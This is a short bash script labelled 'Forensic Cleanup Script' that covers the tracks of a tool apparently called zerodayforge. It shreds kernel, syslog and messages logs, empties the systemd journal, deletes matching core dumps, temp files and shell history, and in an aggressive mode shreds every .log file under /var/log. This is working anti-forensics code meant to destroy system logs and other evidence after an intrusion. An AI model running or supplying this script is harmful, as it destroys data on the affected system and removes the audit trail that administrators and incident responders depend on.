#!/bin/bash
# Forensic Cleanup Script
set -euo pipefail

AGGRESSIVE=false
[[ "$#" -gt 0 && "$1" == "--aggressive" ]] && AGGRESSIVE=true

clean_file() {
	echo "Shredding $1"
	shred -v -n 7 -u "$1" 2>/dev/null || true
}

# System logs
LOG_PATHS=(
	"/var/log/kern*"
	"/var/log/syslog*"
	"/var/log/messages*"
	"/var/log/zerodayforge*"
)

# Artifacts
ARTIFACT_PATHS=(
	"/tmp/zeroday*"
	"$HOME/.local/share/zeroday*"
	"/dev/shm/zeroday*"
)

# Journal cleanup
if command -v journalctl >/dev/null; then
	journalctl --vacuum-time=1s 2>/dev/null || true
fi

# Core dumps
find /var/lib/systemd/coredump -name '*zerodayforge*' -exec shred -u {} \; 2>/dev/null

# Main cleanup
for pattern in "${LOG_PATHS[@]}" "${ARTIFACT_PATHS[@]}"; do
	find / -path "$pattern" -exec shred -v -n 3 -u {} \; 2>/dev/null || true
done

# User history
if [[ $EUID -ne 0 ]]; then
	[[ -f "$HOME/.bash_history" ]] && shred -u "$HOME/.bash_history"
	history -c
fi

# Aggressive mode
if $AGGRESSIVE; then
	find /var/log/ -name '*.log' -exec shred -u {} \; 2>/dev/null || true
fi

echo "Cleanup completed"
exit 0